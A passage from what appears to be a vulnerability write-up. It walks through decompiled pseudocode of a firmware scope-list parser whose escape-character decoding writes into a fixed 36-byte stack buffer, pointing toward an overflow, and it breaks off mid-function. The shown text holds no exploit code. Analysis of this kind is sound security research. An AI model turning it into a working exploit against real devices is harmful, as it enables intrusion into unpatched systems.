&lt;p&gt;When it parses the scope list, it converts escape characters to ASCII. For example, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;\41&lt;/code&gt; will be converted to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;A&lt;/code&gt;.  But what‚Äôs wrong with this simple transformation? Let‚Äôs take a look at the pseudocode.&lt;/p&gt;

&lt;div class=&quot;language-cpp highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;parse_scope_list&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(...){&lt;/span&gt;
	&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;destbuf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;36&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
	&lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;max&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;34&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;parse_escape_char&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(...,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;destbuf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;max&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;As shown in the above code, in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;parse_scope_list&lt;/code&gt;, it passes a fixed size buffer &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;destbuf&lt;/code&gt; and the maximum size 34 to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;parse_escape_char&lt;/code&gt;. No vulnerability here.  Let‚Äôs take a look at &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;parse_escape_char&lt;/code&gt;.&lt;/p&gt;

&lt;div class=&quot;language-cpp highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;__fastcall&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;parse_escape_char&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;__int8&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pdata&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_WORD&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pdatalen&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;__int8&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;destbuf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_WORD&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;max&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;idx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// r7&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v7&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// r9&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// r8&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;error&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// r11&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;__int8&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v10&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// r5&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// r6&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v12&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// r1&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v13&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// r0&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v14&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// r1&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;bool&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v15&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// cc&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// r2&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;bool&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v17&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// cc&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;__int8&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v18&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// r0&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v19&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// r0&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;__int8&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v20&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// r0&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v21&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// r0&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v22&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// r0&lt;/span&gt;

  &lt;span class=&quot;n&quot;&gt;idx&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;v7&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;v8&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;error&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;v10&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pdata&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;__int16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pdatalen&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v7&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;__int16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;v12&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v10&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v12&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;sc&quot;&gt;&apos;,&apos;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
      &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;v7&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
      &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v12&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;sc&quot;&gt;&apos;\\&apos;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;//----------------------[1]&lt;/span&gt;
      &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
          &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;v13&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v10&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;v14&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v13&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;sc&quot;&gt;&apos;0&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;v15&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v13&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;sc&quot;&gt;&apos;0&apos;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;9&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v13&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;sc&quot;&gt;&apos;0&apos;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;9&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
          &lt;span class=&quot;n&quot;&gt;v15&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v13&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;sc&quot;&gt;&apos;A&apos;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;5&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v15&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v13&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;sc&quot;&gt;&apos;a&apos;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;5&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
          &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;v16&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v10&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;v17&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v16&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;sc&quot;&gt;&apos;0&apos;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;9&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v16&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;sc&quot;&gt;&apos;0&apos;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;9&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
          &lt;span class=&quot;n&quot;&gt;v17&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v16&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;sc&quot;&gt;&apos;A&apos;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;5&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v17&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v16&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;sc&quot;&gt;&apos;a&apos;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;5&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
          &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v14&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;9&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
          &lt;span class=&quot;n&quot;&gt;v18&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x10&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v14&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;
          &lt;span class=&quot;n&quot;&gt;v18&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v13&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x37&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v14&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;9&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
          &lt;span class=&quot;n&quot;&gt;v18&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x10&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;destbuf&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v18&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;//-------------------[2]&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;v19&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v10&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;v10&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;v20&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v19&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x30&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;9&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;?&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v19&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;55&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xF&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;destbuf&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;destbuf&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v19&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x30&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xF&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;destbuf&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v20&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;LOWORD&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
